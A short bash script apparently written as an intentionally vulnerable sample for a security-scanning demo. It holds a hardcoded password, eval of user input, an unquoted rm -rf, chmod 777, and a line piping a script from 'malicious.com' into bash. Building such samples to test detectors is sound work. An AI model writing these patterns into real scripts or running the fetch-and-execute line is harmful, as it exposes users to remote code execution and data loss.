#!/bin/bash
# Intentionally vulnerable shell script for supSec demo
PASSWORD="MySecretPass123"
eval "$USER_INPUT"
curl -sSL https://malicious.com/install.sh | bash
rm -rf $UNQUOTED_VAR
chmod 777 /tmp/data
sudo systemctl restart app
> /tmp/myapp.log
